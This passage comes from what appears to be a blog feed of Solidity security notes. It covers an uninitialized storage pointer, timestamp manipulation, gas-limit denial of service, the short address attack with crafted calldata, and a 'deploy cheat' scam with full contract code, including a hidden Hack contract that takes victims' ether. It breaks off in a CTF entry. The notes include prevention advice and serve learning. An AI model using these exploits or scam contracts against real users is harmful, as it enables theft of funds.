in <code>slot[0]</code>, <code>registeredNameRecord</code> in <code>slot[1]</code>, and <code>resolve</code> in <code>slot[2]</code>, etc. Each of these slots is 32 bytes in size (there are added complexities with mappings, which we’ll ignore for now). The Boolean <code>unlocked</code> will look like <code>0x000…0</code> (64 0s, excluding the <code>0x</code>) for <code>false</code> or <code>0x000…1</code> (63 0s) for <code>true</code>. As you can see, there is a significant waste of storage in this particular example.</p><p>The next piece of the puzzle is that Solidity by default puts complex data types, such as structs, in storage when initializing them as local variables. Therefore, <code>newRecord</code> on line 18 defaults to storage. The vulnerability is caused by the fact that <code>newRecord</code> is not initialized. Because it defaults to storage, it is mapped to storage slot[0], which currently contains a pointer to <code>unlocked</code>. Notice that on lines 19 and 20 we then set <code>newRecord.name</code> to <code>_name</code> and <code>newRecord.mappedAddress</code> to <code>_mappedAddress</code>; this updates the storage locations of slot[0] and slot[1], which modifies both <code>unlocked</code> and the storage slot associated with <code>registeredNameRecord</code>.</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>This means that <code>unlocked</code> can be directly modified, simply by the <code>bytes32 _name</code> parameter of the <code>register</code> function. Therefore, if the last byte of <code>_name</code> is nonzero, it will modify the last byte of storage <code>slot[0]</code> and directly change <code>unlocked</code> to <code>true</code>. Such <code>_name</code> values will cause the <code>require</code> call on line 25 to succeed, as we have set <code>unlocked</code> to <code>true</code>. Try this in Remix. Note the function will pass if you use a <code>_name</code> of the form:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000000000000000000000000000000000000000000000000000000001</span><br></pre></td></tr></table></figure><h2 id="self-understand"><a href="#self-understand" class="headerlink" title="self-understand"></a>self-understand</h2><p>注意：只要最低两位不是00就行：01/10/11都可以，因为只有全0(00)才被认为是false</p><p>漏洞理解：0.5.0版本之后，solidity强制需要在结构体写上memory / storage，否则会报错如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from solidity:</span><br><span class="line">njkn.sol:19:9: TypeError: Data location must be &quot;storage&quot; or &quot;memory&quot; for variable, but none was given.</span><br><span class="line">        NameRecord newRecord ;</span><br><span class="line">        ^------------------^</span><br></pre></td></tr></table></figure><ul><li>写上storage：那么我们必须指向一个状态变量</li><li>写上memory：无法影响状态变量</li></ul><p>此漏洞是位于0.5.0版本以下：<code>NameRecord newRecord ;</code>默认是storage，然后未声明一个指针，因此它默认指向第一个slot，因此可以修改storage</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>25.区块时间戳&amp;矿工劫持</title>
      <link href="/2023/06/23/00.security/25.%E5%8C%BA%E5%9D%97%E6%97%B6%E9%97%B4%E6%88%B3&amp;%E7%9F%BF%E5%B7%A5%E5%8A%AB%E6%8C%81/"/>
      <url>/2023/06/23/00.security/25.%E5%8C%BA%E5%9D%97%E6%97%B6%E9%97%B4%E6%88%B3&amp;%E7%9F%BF%E5%B7%A5%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="区块时间戳-amp-矿工劫持"><a href="#区块时间戳-amp-矿工劫持" class="headerlink" title="区块时间戳&amp;矿工劫持"></a>区块时间戳&amp;矿工劫持</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Roulette &#123;</span><br><span class="line">    uint public pastBlockTime; // forces one bet per block</span><br><span class="line"></span><br><span class="line">    constructor() public payable &#123;&#125; // initially fund contract</span><br><span class="line"></span><br><span class="line">    // fallback function used to make a bet</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        require(msg.value == 10 ether); // must send 10 ether to play</span><br><span class="line">        require(now != pastBlockTime); // only 1 transaction per block</span><br><span class="line">        pastBlockTime = now;</span><br><span class="line">        if(now % 15 == 0) &#123; // winner</span><br><span class="line">            msg.sender.transfer(this.balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约就像一个简单的彩票。每个区块的一笔交易可以押注 10 个以太币，就有机会赢取合约余额。这里的假设是block.timestamp 的最后两位是均匀分布的。如果是这样的话，中奖的几率是十五分之一。</p><p>然而，正如我们所知，矿工可以根据需要调整时间戳。在这种特殊情况下，如果合约中有足够的以太池，打包区块的矿工将被可以选择一个时间戳，他可以选择一个符合要求（now % 15 == 0）的时间戳才进行打包自己的交易。通过这样做，他们可能会赢得锁定在该合约中的以太币以及区块奖励。由于每个区块只允许一个人下注，这也很容易受到抢先攻击。</p><p>In practice, block timestamps are monotonically increasing and so miners cannot choose arbitrary block timestamps (they must be later than their predecessors). They are also limited to setting block times not too far in the future, as these blocks will likely be rejected by the network (nodes will not validate blocks whose timestamps are in the future).</p><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>块时间戳不应该用于熵或生成随机数——即，它们不应该是赢得游戏或改变重要状态的决定因素（直接或通过某种推导）。</p><p>有时需要时间敏感的逻辑；例如，用于解锁合同（时间锁定）、几周后完成 ICO 或执行到期日。有时建议使用block.number平均块时间来估计时间；加上出<code>10 second</code>块时间，<code>1 week</code>大约等于<code>60480 blocks</code>. 因此，指定更改合约状态的区块号可能更安全，因为矿工无法轻易操纵区块号。<a href="http://bit.ly/2AAebFr">BAT ICO</a>合约采用了这种策略。</p><p>如果合约不是特别关心矿工对区块时间戳的操作，这可能是不必要的，但在开发合约时需要注意这一点。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>24.拒绝服务攻击_2</title>
      <link href="/2023/06/23/00.security/24.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB_2/"/>
      <url>/2023/06/23/00.security/24.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB_2/</url>
      
        <content type="html"><![CDATA[<h1 id="拒绝服务攻击-2"><a href="#拒绝服务攻击-2" class="headerlink" title="拒绝服务攻击_2"></a>拒绝服务攻击_2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; // gets set somewhere</span><br><span class="line">    address[] investors; // array of investors</span><br><span class="line">    uint[] investorTokens; // the amount of tokens each investor gets</span><br><span class="line"></span><br><span class="line">    // ... extra functionality, including transfertoken()</span><br><span class="line"></span><br><span class="line">    function invest() public payable &#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * 5); // 5 times the wei sent</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    function distribute() public &#123;</span><br><span class="line">        require(msg.sender == owner); // only owner</span><br><span class="line">        for(uint i = 0; i &lt; investors.length; i++) &#123;</span><br><span class="line">            // here transferToken(to,amount) transfers &quot;amount&quot; of</span><br><span class="line">            // tokens to the address &quot;to&quot;</span><br><span class="line">            transferToken(investors[i],investorTokens[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，此合约中的for循环运行在一个可以人为膨胀的数组上。攻击者可以创建许多用户帐户，使<code>investor</code>数组变大。原则上，这样做可以使执行 for 循环所需的气体超过区块气体限制，从根本上使该<code>distribute</code>功能无法运行。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>22.短地址攻击</title>
      <link href="/2023/06/23/00.security/22.%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%94%BB%E5%87%BB/"/>
      <url>/2023/06/23/00.security/22.%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="短地址攻击"><a href="#短地址攻击" class="headerlink" title="短地址攻击"></a>短地址攻击</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>短地址攻击是一种漏洞，可能发生在用 Solidity 编写的智能合约中，Solidity 是用于在以太坊平台上编写合约的编程语言。当合约使用短地址或少于 20 字节的地址作为输入或输出值时，EVM 会将 0 填到编码参数的末尾以补成预期的长度。就会出现此漏洞。</p><p>当第三方应用程序不验证输入时，这会成为问题。最明显的例子是当用户请求提款时，交易所不验证 ERC20 Token 的地址。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>考虑一下标准的 ERC20 传输函数接口，注意参数的顺序，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address to, uint tokens) public returns (bool success);</span><br></pre></td></tr></table></figure><p>现在考虑一下，一个交易所持有大量代（比方说 <code>REP</code> ），并且，某用户希望取回他们存储的100个代币。用户将提交他们的地址， <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddead</code> 以及代币的数量 <code>100</code> 。交易所将根据 <code>transfer()</code> 函数指定的顺序对这些参数进行编码，即先是 <code>address</code> 然后是 <code>tokens</code> 。编码结果将是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeaddead0000000000000000000000000000000000000000000000056bc75e2d63100000</span><br></pre></td></tr></table></figure><p>提取出函数签名，剩余位数要以32字节分隔开：<br> <code>a9059cbb</code><br> <code>000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeaddead</code><br> <code>0000000000000000000000000000000000000000000000056bc75e2d63100000</code><br> 前四个字节（a9059cbb）是 <code>transfer()</code>  <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fsolidity.readthedocs.io%2Fen%2Flatest%2Fabi-spec.html%23function-selector">函数签名/选择器</a>；<br> 第二个 32 字节是地址；<br> 最后 32 个字节是表示代币数量的 <code>uint256</code> 。请注意，最后的十六进制数 <code>56bc75e2d63100000</code> 对应于 100 个代币（包含 18 个小数位，这是由 REP 代币合约指定的）。</p><p>好的，现在让我们看看如果我们发送一个<strong>丢失2个十六进制数</strong>的地址会发生什么。具体而言，假设攻击者以 <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde</code> 作为地址发送（缺少最后两位数字），并取回相同的 <code>100</code> 个代币。如果交易所没有验证这个输入，它将被编码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeadde0000000000000000000000000000000000000000000000056bc75e2d6310000000</span><br></pre></td></tr></table></figure><p>提取出函数签名，剩余位数要以32字节分隔开：<br> <code>a9059cbb</code><br> <code>000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeadde00</code><br> <code>00000000000000000000000000000000000000000000056bc75e2d6310000000</code><br> 差别是微妙的。请注意， <code>00</code> 已被填充到编码的末尾，以补完发送的短地址。当它被发送到智能合约时， <code>address</code> 参数将被读为 <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde00</code> 并且值将被读为 <code>56bc75e2d6310000000</code> （注意两个额外的 0）。此值现在是 <code>25600</code> 个代币（值已被乘以 <code>256</code> ）。在这个例子中，如果交易所持有这么多的代币，用户会取出 25600 个代币（而交换所认为用户只是取出 100）到修改后的地址。很显然，在这个例子中攻击者不会拥有修改后的地址，但是如果攻击者产生了以 0 结尾的地址（很容易强制产生）并且使用了这个生成的地址，他们很容易从毫无防备的交易所中窃取令牌。</p><h2 id="预防手段"><a href="#预防手段" class="headerlink" title="预防手段"></a>预防手段</h2><ul><li>我想很明显，在将所有输入发送到区块链之前对其进行验证可以防止这些类型的攻击。还应该指出的是参数排序在这里起着重要的作用。由于填充只发生在字符串末尾，智能合约中参数的缜密排序可能会缓解此攻击的某些形式。</li><li>参数不要使用address，而是使用bytes20</li><li>使用方法isContract()验证参数是一个合约</li></ul>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>21.deploy cheat</title>
      <link href="/2023/06/23/00.security/21.deploy%20cheat/"/>
      <url>/2023/06/23/00.security/21.deploy%20cheat/</url>
      
        <content type="html"><![CDATA[<h1 id="deploy-cheat"><a href="#deploy-cheat" class="headerlink" title="deploy cheat"></a>deploy cheat</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>大家还记得之前几期部署攻击合约时我们会传入目标合约的地址，在攻击合约中就可以调用目标合约中的函数吗，有些攻击者会利用这一点欺骗受害者。比如部署一个 A 合约并告诉受害者我们会在部署 A 合约的构造函数中传入 B 合约的地址并将 B 合约开源，其实我们会在部署 A 合约时传入 C 合约的地址，如果受害者完全信任我们没有检查部署 A 合约的那笔交易，我们就完美的将恶意代码隐藏在了 C 合约中。我们可以从下图来理解这个逻辑：</p><p><img src="https://moe.photo/images/2023/01/16/640.png" alt></p><p>用户以为的调用路径：部署合约 A 传入合约 B 地址，这样调用路径为正常路径。</p><p>实际的调用路径：部署合约 A 传入合约 C 地址，这样调用路径为非正常路径。</p><p>下面我们使用一个简单的例子来分析这个骗局：</p><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract MoneyMaker &#123;</span><br><span class="line">    Vault vault;</span><br><span class="line"></span><br><span class="line">    constructor(address _vault) &#123;</span><br><span class="line">        vault = Vault(payable(_vault));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeMoney(address recipient) public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1, &quot;You are so poor!&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 amount = msg.value * 2;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = address(vault).call&#123;value: msg.value, gas: 2300&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Send failed&quot;);</span><br><span class="line"></span><br><span class="line">        vault.transfer(recipient, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Vault &#123;</span><br><span class="line">    address private maker;</span><br><span class="line">    address private owner;</span><br><span class="line">    uint256 transferGasLimit;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        transferGasLimit = 2300;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier OnlyMaker() &#123;</span><br><span class="line">        require(msg.sender == maker, &quot;Not MoneyMaker contract!&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier OnlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not owner!&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMacker(address _maker) public OnlyOwner &#123;</span><br><span class="line">        maker = _maker;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address recipient, uint256 amount) external OnlyMaker &#123;</span><br><span class="line">        require(amount &lt;= address(this).balance, &quot;Game Over~&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = recipient.call&#123;value: amount, gas: transferGasLimit&#125;(</span><br><span class="line">            &quot;&quot;</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Send failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withrow() public OnlyOwner &#123;</span><br><span class="line">        (bool success, ) = owner.call&#123;</span><br><span class="line">            value: address(this).balance,</span><br><span class="line">            gas: transferGasLimit</span><br><span class="line">        &#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Send failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract MoneyMaker &#123;</span><br><span class="line">    Vault vault;</span><br><span class="line"></span><br><span class="line">    constructor(address _vault) &#123;</span><br><span class="line">        vault = Vault(payable(_vault));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeMoney(address recipient) public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1, &quot;You are so poor!&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 amount = msg.value * 2;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = address(vault).call&#123;value: msg.value, gas: 2300&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Send failed&quot;);</span><br><span class="line"></span><br><span class="line">        vault.transfer(recipient, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    address private maker;</span><br><span class="line">    address private owner;</span><br><span class="line">    uint256 transferGasLimit;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        transferGasLimit = 2300;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier OnlyMaker() &#123;</span><br><span class="line">        require(msg.sender == maker, &quot;Not MoneyMaker contract!&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier OnlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not owner!&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMacker(address _maker) public OnlyOwner &#123;</span><br><span class="line">        maker = _maker;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount) external OnlyMaker &#123;</span><br><span class="line">        require(amount &lt;= address(this).balance, &quot;Game Over~&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = recipient.call&#123;value: amount, gas: transferGasLimit&#125;(</span><br><span class="line">            &quot;&quot;</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Send failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withrow() public OnlyOwner &#123;</span><br><span class="line">        (bool success, ) = owner.call&#123;</span><br><span class="line">            value: address(this).balance,</span><br><span class="line">            gas: transferGasLimit</span><br><span class="line">        &#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Send failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This code is hidden in a separate file</span><br><span class="line">contract Hack &#123;</span><br><span class="line">    event taunt(string message);</span><br><span class="line">    address private evil;</span><br><span class="line"></span><br><span class="line">    constructor(address _evil) &#123;</span><br><span class="line">        evil = _evil;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier OnlyEvil() &#123;</span><br><span class="line">        require(msg.sender == evil, &quot;What are you doing?&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer() public payable &#123;</span><br><span class="line">        emit taunt(&quot;Haha, your ether is mine!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withrow() public OnlyEvil &#123;</span><br><span class="line">        (bool success, ) = evil.call&#123;value: address(this).balance, gas: 2300&#125;(</span><br><span class="line">            &quot;&quot;</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Send failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="骗局分析"><a href="#骗局分析" class="headerlink" title="骗局分析"></a>骗局分析</h2><p>可以看到，上述代码中存在三个合约，我们先结合前置知识中的 A, B, C 三个角色来区分三个合约分别代表什么角色：</p><p>MoneyMaker 合约代表 A 合约；Vault 合约代表 B 合约；Hack 合约代表 C 合约。</p><p>所以用户以为的调用路径为：MoneyMaker -&gt; Vault。</p><p>而实际的调用路径为：MoneyMaker -&gt; Hack。</p><p>下面我们来看看攻击者如何完成骗局的：</p><ol><li>Evil 部署 Vault(B) 合约并在合约中留存 100 ETH 资金，在链上将 Vault(B) 合约开源；</li><li>Evil 部署 Hack(C) 恶意合约；</li><li>Evil 放出消息说他将会部署一个开源的赚钱 MoneyMaker(A) 合约，部署时会将 Vault(B) 合约地址传入且会调用 Vault.setMacker() 将 maker 角色设置为 MoneyMaker 合约地址，任何人调用 MoneyMaker.makeMoney() 向合约中打入不少于一个以太都会得到双倍以太的回报；</li><li>Bob 收到消息，了解到 MoneyMaker 合约的存在，他看了 MoneyMaker(A) 和 Vault(B) 合约的代码并检查了 Vault(B) 合约中的余额发现逻辑确实如 Evil 说的那样，他在没有检查 MoneyMaker(A) 部署交易的情况下就相信了 Evil；</li><li>Bob 调用 MoneyMaker.makeMoney() 向合约中打入自己全部身家 20 ETH，在他满怀期待等着收到 Vault(B) 打来的 40 ETH 时等来的却是一句 “Haha, your ether is mine!”。</li></ol><p>咋回事呢？其实这个骗局非常简单但是很常见。Evil 在部署 MoneyMaker 合约时传入的并不是 Vault 合约的地址，而是传入了 Hack 合约的地址。所以当 Bob 调用 MoneyMaker.makeMoney() 时并不会像他想像中的那样 MoneyMaker.makeMoney() 去调用 Vault.transfer() 回打给他双倍的以太，而是调用了 Hack.transfer() 抛出了一个事件：”Haha, your ether is mine!”。最后 Evil 调用 Vault.withrow() 将 Vault 合约中的 100 ETH 转出，并通过 Hack.withrow() 将 Bob 转入的 20 ETH 转出。</p><h2 id="预防建议"><a href="#预防建议" class="headerlink" title="预防建议"></a>预防建议</h2><p>以太坊黑暗森林中你能相信的只有自己，不要相信任何人精彩的话术，交易记录不会造假，只有自己验证了对应的那笔交易后才能相信对方说的话是对的。</p><p><a href="https://mp.weixin.qq.com/s/_ZMXHQprtHkdCeomhJ9A_Q">引用：满屋科技—-移花接木</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>20.copy_wallet</title>
      <link href="/2023/06/23/00.security/20.copy_wallet/"/>
      <url>/2023/06/23/00.security/20.copy_wallet/</url>
      
        <content type="html"><![CDATA[<h1 id="copy-wallet"><a href="#copy-wallet" class="headerlink" title="copy_wallet"></a>copy_wallet</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：成功调用<code>isCompleted(string memory email)</code>，返回true</p><p>下面的所有注释是我的理解与思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 